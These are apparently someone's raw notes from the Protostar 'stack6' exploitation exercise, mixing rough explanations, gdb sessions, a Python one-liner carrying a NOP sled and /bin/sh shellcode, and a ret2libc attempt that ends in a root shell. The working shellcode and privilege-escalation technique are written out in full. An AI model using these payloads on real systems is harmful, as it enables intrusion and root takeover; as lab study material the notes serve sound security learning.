exploit libc

__build_return_address() ::: it is compiler function it return return address of current address 
 
ret & 0xbf000000 == 0xbf000000

if (ret start with 0xbf)
 than 
 	it print zzz and exit 
 otherwise 
 	print got path
			


our exploit don't worked

		\ret of getpath \   -->    \remove add. of getpath\ --> \add. of shellcode\
		\ add of main   \				       \	nop      \
		\ push 3        \				       \  shellcode      \
	       -------------------				       ---------------------
	       


			find memory address of function


find start_add, +len, val1[, val2, ...]			||    strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"   --> -t x is from that file
find start_add, end_add, val1[, val2, ...]		||

finsl_address is address_of_libc + out_add_of(strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"   --> -t x is from that file)







	       
 (python -c "import sys; sys.stdout.write('\x90'*76 + '\x50\xf7\xff\xbf' + '\x90'*30 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')";) | ./stack6
input path please: got path ����������������������������������������������������������������������������P���������������������������������1�1۰Sh/ttyh/dev��1�f�'�1�Ph//shh/bin��PS�ᙰ

Segmentation fault
user@protostar:/opt/protostar/bin$ (python -c "import sys; sys.stdout.write('\x90'*76 + '\x00\xf8\xff\xbf' + '\x90'*30 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')";) | ./stack6
input path please: got path ����������������������������������������������������������������������������
Segmentation fault
user@protostar:/opt/protostar/bin$ gdb ./stack6
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) set disa
disable-randomization  disassemble-next-line  disassembly-flavor     
(gdb) set disa
disable-randomization  disassemble-next-line  disassembly-flavor     
(gdb) set disassembly-flavor intel 
(gdb) disassemble main
Dump of assembler code for function main:
0x080484fa <main+0>:    push   ebp
0x080484fb <main+1>:    mov    ebp,esp
0x080484fd <main+3>:    and    esp,0xfffffff0
0x08048500 <main+6>:    call   0x8048484 <getpath>
0x08048505 <main+11>:   mov    esp,ebp
0x08048507 <main+13>:   pop    ebp
0x08048508 <main+14>:   ret    
End of assembler dump.
(gdb) info funtion
Undefined info command: "funtion".  Try "help info".
(gdb) info funtions
Undefined info command: "funtions".  Try "help info".
(gdb) help info
Generic command for showing things about the program being debugged.

List of info subcommands:

info address -- Describe where symbol SYM is stored
info all-registers -- List of all registers and their contents
info args -- Argument variables of current stack frame
info auxv -- Display the inferior's auxiliary vector
info breakpoints -- Status of user-settable breakpoints
info catch -- Exceptions that can be caught in the current stack frame
info checkpoints -- IDs of currently known checkpoints
info classes -- All Objective-C classes
info common -- Print out the values contained in a Fortran COMMON block
info copying -- Conditions for redistributing copies of GDB
info dcache -- Print information on the dcache performance
info display -- Expressions to display when program stops
info extensions -- All filename extensions associated with a source language
info files -- Names of targets and files being debugged
info float -- Print the status of the floating point unit
info frame -- All about selected stack frame
info functions -- All function names
info handle -- What debugger does when program gets various signals
info inferiors -- IDs of currently known inferiors
info line -- Core addresses of the code for a source line
info locals -- Local variables of current stack frame
info macro -- Show the definition of MACRO
info mem -- Memory region attributes
---Type <return> to continue, or q <return> to quit---
info os -- Show OS data ARG
info proc -- Show /proc process information about any running process
info program -- Execution status of the program
info record -- Info record options
info registers -- List of integer registers and their contents
info scope -- List the variables local to a scope
info selectors -- All Objective-C selectors
info set -- Show all GDB settings
info sharedlibrary -- Status of loaded shared object libraries
info signals -- What debugger does when program gets various signals
info source -- Information about the current source file
info sources -- Source files in the program
info stack -- Backtrace of the stack
info symbol -- Describe what symbol is at location ADDR
info target -- Names of targets and files being debugged
info tasks -- Provide information about all known Ada tasks
info terminal -- Print inferior's saved terminal status
info threads -- IDs of currently known threads
info tracepoints -- Status of tracepoints
info types -- All type names
info variables -- All global and static variable names
info vector -- Print the status of the vector unit
info warranty -- Various kinds of warranty you do not have
info watchpoints -- Synonym for ``info breakpoints''
info win -- List of all displayed windows

Type "help info" followed by info subcommand name for full documentation.
---Type <return> to continue, or q <return> to quit---
Type "apropos word" to search for commands related to "word".
Command name abbreviations are allowed if unambiguous.
(gdb) info functions
All defined functions:

File stack6/stack6.c:
void getpath(void);
int main(int, char **);

Non-debugging symbols:
0x08048330  _init
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  gets
0x08048380  gets@plt
0x08048390  __libc_start_main
0x08048390  __libc_start_main@plt
0x080483a0  _exit
0x080483a0  _exit@plt
0x080483b0  fflush
0x080483b0  fflush@plt
0x080483c0  printf
0x080483c0  printf@plt
0x080483d0  _start
0x08048400  __do_global_dtors_aux
0x08048460  frame_dummy
0x08048510  __libc_csu_fini
0x08048520  __libc_csu_init
0x0804857a  __i686.get_pc_thunk.bx
0x08048580  __do_global_ctors_aux
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) b *getpath
Breakpoint 1 at 0x8048484: file stack6/stack6.c, line 7.
(gdb) r
Starting program: /opt/protostar/bin/stack6 

Breakpoint 1, getpath () at stack6/stack6.c:7
7       stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) info register
eax            0xbffff854       -1073743788
ecx            0xf34f2416       -212917226
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff79c       0xbffff79c
ebp            0xbffff7a8       0xbffff7a8
esi            0x0      0
edi            0x0      0
eip            0x8048484        0x8048484 <getpath>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) info proc map
process 1979
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fe0000 0xb7fe2000     0x2000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) disassemble  getpath
Dump of assembler code for function getpath:
0x08048484 <getpath+0>: push   ebp
0x08048485 <getpath+1>: mov    ebp,esp
0x08048487 <getpath+3>: sub    esp,0x68
0x0804848a <getpath+6>: mov    eax,0x80485d0
0x0804848f <getpath+11>:        mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:        call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:        mov    eax,ds:0x8049720
0x0804849c <getpath+24>:        mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:        call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:        lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:        mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
0x080484af <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:        and    eax,0xbf000000
0x080484bd <getpath+57>:        cmp    eax,0xbf000000
0x080484c2 <getpath+62>:        jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:        mov    eax,0x80485e4
0x080484c9 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:        mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:        call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:        mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:        call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:        mov    eax,0x80485f0
---Type <return> to continue, or q <return> to quit---
0x080484e9 <getpath+101>:       lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:       mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:       call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:       leave  
0x080484f9 <getpath+117>:       ret    
End of assembler dump.
(gdb) p $eip
$1 = (void (*)()) 0x8048484 <getpath>
(gdb) x getpath
0x8048484 <getpath>:    0x83e58955
(gdb) 




(gdb) find 0xb7e97000, +9999999, "/bin/sh" 
0xb7fba23f 
(gdb) x/s 0xb7fba23f
sdsdsdsdsds (not "/bin/sh")             not worked -->   so need other technique 



$strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
0x11f3bf

(gdb) x/s 0xb7e97000+0x11f3bf
0xb7fb63bf:         "/bin/sh"


user@protostar:/tmp$ python stack6.py | /opt/protostar/bin/stack6
input path please: got path 0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO����QQQQRRRRSSSS����AAAA�c��
Segmentation fault
user@protostar:/tmp$ (python stack6.py;cat) | /opt/protostar/bin/stack6
input path please: got path 0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO����QQQQRRRRSSSS����AAAA�c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root




